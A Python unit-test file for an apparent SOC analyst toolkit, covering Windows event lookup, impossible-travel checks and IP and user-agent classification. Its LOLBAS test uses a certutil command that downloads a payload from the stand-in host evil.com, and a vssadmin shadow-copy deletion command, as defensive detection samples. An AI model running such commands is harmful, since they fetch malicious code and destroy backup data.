"""Unit tests for L1 SOC Analyst toolkit functions."""

import pytest
from core.soc_analyst import (
    lookup_windows_event,
    analyze_command_line,
    calculate_impossible_travel,
    check_false_positive_indicators,
    classify_ip_infrastructure,
    dissect_user_agent,
)


def test_windows_event_lookup():
    # 1. NTSTATUS code lookup
    res_code = lookup_windows_event("0xC000006A")
    assert len(res_code["matched_ntstatus"]) > 0
    assert "BAD_PASSWORD" in res_code["matched_ntstatus"][0]["name"]

    # 2. Event ID 4625
    res_event = lookup_windows_event("Failed logon Event ID: 4625")
    assert len(res_event["matched_events"]) > 0
    assert res_event["matched_events"][0]["event_id"] == "4625"

    # 3. Logon Type 10 (RDP)
    res_type = lookup_windows_event("Logon Type: 10")
    assert len(res_type["matched_logon_types"]) > 0
    assert "Remote Desktop" in res_type["matched_logon_types"][0]["name"]


def test_lolbas_analyzer():
    # Test certutil download command
    cmd = 'certutil.exe -urlcache -split -f "https://evil.com/payload.exe" out.exe'
    res = analyze_command_line(cmd)
    assert res["is_lolbas"] is True
    assert res["overall_risk"] == "HIGH"
    assert len(res["matched_tools"]) > 0
    assert res["matched_tools"][0]["binary"] == "certutil.exe"
    assert "https://evil.com/payload.exe" in res["extracted_urls"]

    # Test vssadmin shadow delete (Ransomware hallmark)
    res_vss = analyze_command_line("vssadmin delete shadows /all /quiet")
    assert res_vss["is_lolbas"] is True
    assert res_vss["overall_risk"] == "CRITICAL"


def test_impossible_travel():
    # Jakarta to Frankfurt (11,000+ km in 30 minutes)
    res = calculate_impossible_travel(
        lat1=-6.2088, lon1=106.8456, time1_str="2026-10-13T08:00:00Z",
        lat2=50.1109, lon2=8.6821, time2_str="2026-10-13T08:30:00Z",
        loc1_name="Jakarta, ID", loc2_name="Frankfurt, DE",
    )
    assert res["success"] is True
    assert res["is_impossible"] is True
    assert res["required_speed_kmh"] > 10000.0
    assert "IMPOSSIBLE TRAVEL CONFIRMED" in res["verdict"]

    # Short distance (within town in 1 hour)
    res_ok = calculate_impossible_travel(
        lat1=-6.2088, lon1=106.8456, time1_str="2026-10-13T08:00:00Z",
        lat2=-6.2200, lon2=106.8500, time2_str="2026-10-13T09:00:00Z",
        loc1_name="Central Jakarta", loc2_name="South Jakarta",
    )
    assert res_ok["success"] is True
    assert res_ok["is_impossible"] is False


def test_fp_whitelist_checker():
    # Microsoft telemetry domain
    res_ms = check_false_positive_indicators("events.data.microsoft.com")
    assert res_ms["is_likely_false_positive"] is True
    assert len(res_ms["matches"]) > 0

    # RMM tool
    res_rmm = check_false_positive_indicators("anydesk.exe")
    assert len(res_rmm["matches"]) > 0
    assert "RMM" in res_rmm["matches"][0]["category"]


def test_ip_classifier():
    # Datacenter ASN
    res_dc = classify_ip_infrastructure("54.239.28.85", asn_info="AS16509 Amazon.com", org_info="Amazon")
    assert "PUBLIC_CLOUD_DATACENTER" in res_dc["tags"]
    assert "Amazon" in res_dc["classification"]

    # VPN Org
    res_vpn = classify_ip_infrastructure("185.220.101.5", asn_info="AS9009", org_info="Mullvad VPN")
    assert "COMMERCIAL_VPN" in res_vpn["tags"]


def test_user_agent_dissector():
    # 1. Sqlmap offensive tool
    res_sql = dissect_user_agent("sqlmap/1.6#stable (https://sqlmap.org)")
    assert res_sql["category"] == "OFFENSIVE_SECURITY_SCANNER"
    assert res_sql["threat_level"] == "CRITICAL"

    # 2. Python requests
    res_py = dissect_user_agent("python-requests/2.31.0")
    assert res_py["category"] == "SCRIPTING_AUTOMATION_LIBRARY"

    # 3. Headless Chrome
    res_bot = dissect_user_agent("Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/91.0.4472.114 Safari/537.36")
    assert res_bot["category"] == "HEADLESS_AUTOMATION_BROWSER"

    # 4. Standard Chrome
    res_chrome = dissect_user_agent("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36")
    assert res_chrome["category"] == "STANDARD_BROWSER"
    assert res_chrome["is_malicious"] is False
